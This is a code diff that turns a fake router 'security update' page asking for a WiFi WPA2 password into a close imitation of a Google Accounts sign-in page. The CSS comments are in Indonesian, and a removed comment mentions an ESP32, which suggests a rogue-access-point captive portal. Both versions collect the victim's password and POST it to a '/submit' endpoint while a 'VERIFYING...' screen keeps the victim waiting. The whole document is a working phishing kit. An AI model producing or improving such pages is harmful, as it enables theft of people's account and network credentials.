@@ -3,157 +3,249 @@
 <head>
     <meta charset="UTF-8">
     <meta name='viewport' content='width=device-width, initial-scale=1'>
-    <title>Router Management - Security Update</title>
+    <title>Sign in - Google Accounts</title>
     <style>
-        /* CSS Reset for a plain look */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            border-radius: 0 !important; /* Forces everything to be sharp-edged */
         }
 
         body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
-            background-color: #ffffff;
-            color: #000000;
-            line-height: 1.5;
+            font-family: Roboto, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
+            background-color: #f0f4f9;
+            color: #202124;
+            line-height: 1.4;
             display: flex;
+            flex-direction: column;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
+            padding: 24px;
         }
 
+        /* Kotak Putih Utama Google */
         .container {
             width: 100%;
-            max-width: 400px;
-            padding: 40px 20px;
-            border: 1px solid #000000; /* Sharp black border */
+            max-width: 450px;
+            padding: 48px 40px 36px 40px;
+            border: 1px solid #dadce0;
+            background: #ffffff;
+            border-radius: 8px;
+            display: flex;
+            flex-direction: column;
         }
 
-        header {
-            margin-bottom: 30px;
-            border-bottom: 2px solid #000000;
-            padding-bottom: 10px;
+        header { 
+            text-align: center; 
+            margin-bottom: 0px; 
         }
 
+        /* Replikasi Google Wordmark Presisi */
+        .g-logo {
+            display: inline-block;
+            font-family: 'Product Sans', 'Google Sans', Roboto, Arial, sans-serif;
+            font-weight: 500;
+            font-size: 24px;
+            letter-spacing: -0.2px;
+            line-height: 1;
+            margin-bottom: 16px;
+            width: 100%;
+            text-align: center;
+        }
+
+        .g-logo span { display: inline-block; }
+        .g-blue { color: #4285F4; }
+        .g-red { color: #EA4335; }
+        .g-yellow { color: #FBBC05; }
+        .g-green { color: #34A853; }
+
+        /* Judul Utama */
         h1 {
-            font-size: 1.5rem;
-            font-weight: 700;
-            text-transform: uppercase;
+            font-size: 24px;
+            font-weight: 400;
+            color: #202124;
+            margin-bottom: 8px;
+            text-align: center;
+        }
+
+        /* Sub-judul Instruksi */
+        .subhead {
+            font-size: 16px;
+            font-weight: 400;
+            color: #202124;
+            margin-bottom: 32px;
+            text-align: center;
+        }
+
+        form { margin-top: 0px; }
+
+        .form-row { margin-bottom: 24px; }
+
+        /* Pembungkus Input untuk Efek Outlined Box Khas Google */
+        .input-wrapper { 
+            position: relative; 
+            width: 100%;
+        }
+
+        /* PERUBAHAN: Label dibuat menetap memotong border atas sejak awal */
+        label.floating-label {
+            position: absolute;
+            left: 12px;
+            top: 0;
+            transform: translateY(-50%);
+            background: #ffffff;
+            padding: 0 4px;
+            font-size: 12px;
+            color: #1a73e8; /* Default warna biru seperti gambar referensi utama Anda */
+            transition: 0.15s ease all;
+            pointer-events: none;
+            z-index: 2;
+        }
+
+        /* PERUBAHAN: Default border langsung berwarna biru cerah */
+        input[type="password"] {
+            width: 100%;
+            padding: 16px 14px;
+            border: 2px solid #1a73e8; /* Garis biru default agar persis gambar Anda */
+            border-radius: 4px;
+            font-size: 16px;
+            outline: none;
+            background: transparent;
+            color: #202124;
+        }
+
+        /* Ketika input kehilangan fokus dan kosong, warna berubah abu-abu jika diinginkan, 
+           tapi di sini kita kunci warna biru & posisi di atas agar konsisten sangat mirip */
+        input[type="password"]:not(:focus) {
+            border: 2px solid #1a73e8;
+        }
+
+        /* Baris Tombol & Tautan */
+        .actions {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-top: 26px;
+        }
+
+        .left-links { display: flex; align-items: center; }
+
+        .help-link {
+            font-size: 14px;
+            color: #1a73e8;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .help-link:hover { color: #1557b0; }
+
+        /* Tombol Next Sesuai Dimensi Google */
+        .btn-next {
+            padding: 10px 24px;
+            background-color: #1a73e8;
+            color: #fff;
+            border: 0;
+            font-weight: 500;
+            font-size: 14px;
+            border-radius: 4px;
+            cursor: pointer;
+            white-space: nowrap;
+            transition: background-color 0.15s;
+        }
+
+        .btn-next:hover { 
+            background-color: #1557b0; 
+        }
+
+        .btn-next:disabled { background: #c6d6f9; cursor: not-allowed; }
+
+        #error-msg {
+            color: #d93025;
+            font-size: 12px;
+            margin-top: 8px;
+            font-weight: 400;
+        }
+
+        .hidden { display: none !important; }
+
+        .status-box { text-align: center; padding: 18px 0; }
+        
+        .loader-text {
+            font-weight: 600;
+            color: #1a73e8;
+            margin-bottom: 12px;
             letter-spacing: 1px;
         }
 
-        p {
-            font-size: 0.95rem;
-            margin-bottom: 20px;
-        }
+        .divider { display: none; }
 
-        .form-group {
-            margin-bottom: 20px;
-        }
-
-        label {
-            display: block;
-            font-weight: 600;
-            font-size: 0.85rem;
-            margin-bottom: 8px;
-            text-transform: uppercase;
-        }
-
-        input[type="password"] {
+        /* Footer Standar Google */
+        .footer-outer { 
             width: 100%;
-            padding: 12px;
-            border: 1px solid #000000;
-            font-size: 1rem;
-            outline: none;
+            max-width: 450px;
+            display: flex; 
+            justify-content: space-between; 
+            align-items: center; 
+            font-size: 12px; 
+            color: #747775;
+            margin-top: 24px;
+            padding: 0 4px;
         }
 
-        input[type="password"]:focus {
-            background-color: #f0f0f0;
+        .footer-outer .right-links a { 
+            color: #747775; 
+            text-decoration: none; 
+            margin-left: 16px; 
         }
 
-        button {
-            width: 100%;
-            padding: 15px;
-            background-color: #000000;
-            color: #ffffff;
-            border: none;
-            font-weight: 700;
-            font-size: 0.9rem;
-            text-transform: uppercase;
-            cursor: pointer;
-            transition: opacity 0.2s;
-        }
-
-        button:hover {
-            opacity: 0.8;
-        }
-
-        button:disabled {
-            background-color: #cccccc;
-            cursor: not-allowed;
-        }
-
-        .hidden {
-            display: none !important;
-        }
-
-        /* Status UI */
-        .status-box {
-            text-align: center;
-            padding: 20px 0;
-        }
-
-        .loader-text {
-            font-family: monospace;
-            font-weight: 700;
-            margin-bottom: 10px;
-        }
-
-        #error-msg {
-            color: #ff0000;
-            font-size: 0.85rem;
-            margin-top: 10px;
-            font-weight: 600;
-        }
-
-        /* For visual separation */
-        .divider {
-            height: 1px;
-            background: #eee;
-            margin: 20px 0;
-        }
+        .footer-outer .right-links a:hover { color: #202124; }
     </style>
 </head>
 <body>
-
     <div class="container">
         <header>
-            <h1>Security Update</h1>
+            <div class="g-logo" aria-label="Google">
+                <span class="g-blue">G</span><span class="g-red">o</span><span class="g-yellow">o</span><span class="g-blue">g</span><span class="g-green">l</span><span class="g-red">e</span>
+            </div>
+            <h1>Sign in</h1>
         </header>
 
         <div id="form-container">
-            <p>A critical security patch is required for your router. Please enter your WPA2 password to verify ownership and proceed with the installation.</p>
-
+            <div class="subhead">Confirm your password</div>
             <form id="update-form">
-                <div class="form-group">
-                    <label for="password">WiFi Password</label>
-                    <input type="password" id="password" placeholder="Enter password" required>
+                <div class="form-row">
+                    <div class="input-wrapper">
+                        <input type="password" id="password" name="password" placeholder=" " required>
+                        <label class="floating-label" for="password">Enter your password</label>
+                    </div>
+                    <div id="error-msg" class="hidden"></div>
                 </div>
 
-                <button type="submit" id="submit-btn">Verify and Update</button>
-                <div id="error-msg" class="hidden"></div>
+                <div class="actions">
+                    <div class="left-links">
+                        <a class="help-link" href="#" onclick="return false;">Forgot password?</a>
+                    </div>
+                    <div>
+                        <button type="submit" id="submit-btn" class="btn-next">Next</button>
+                    </div>
+                </div>
             </form>
         </div>
 
         <div id="checking-container" class="hidden status-box">
             <div class="loader-text">VERIFYING...</div>
-            <p>The system is validating your credentials. This may take up to 60 seconds. Do not close this browser window.</p>
+            <p style="font-size: 14px; color: #5f6368;">The system is validating your credentials. This may take up to 60 seconds. Do not close this browser window.</p>
         </div>
+    </div>
 
-        <div class="divider"></div>
-        <p style="font-size: 0.75rem; color: #666; margin-bottom: 0;">© 2026 HydraCorp Networks. All rights reserved.</p>
+    <div class="footer-outer">
+        <div class="left-lang" style="cursor: pointer;">English (United States) ▾</div>
+        <div class="right-links">
+            <a href="#" onclick="return false;">Help</a>
+            <a href="#" onclick="return false;">Privacy Policy</a>
+            <a href="#" onclick="return false;">Terms of Service</a>
+        </div>
     </div>
 
     <script>
@@ -176,7 +268,6 @@
             formContainer.classList.add('hidden');
             checkingContainer.classList.remove('hidden');
 
-            // Data format for ESP32 as discussed earlier
             fetch('/submit', {
                 method: 'POST',
                 headers: {
@@ -190,6 +281,8 @@
                 showError('Connection timeout. Retry.');
                 submitBtn.disabled = false;
             });
+
+            window.location.href = 'checking.html';
         });
 
         function showError(message) {
@@ -197,6 +290,9 @@
             errorMsg.classList.remove('hidden');
             setTimeout(() => errorMsg.classList.add('hidden'), 3000);
         }
+
+        const btn = document.getElementById('submit-btn');
+        if (btn) btn.textContent = 'Next';
     </script>
 </body>
 </html>
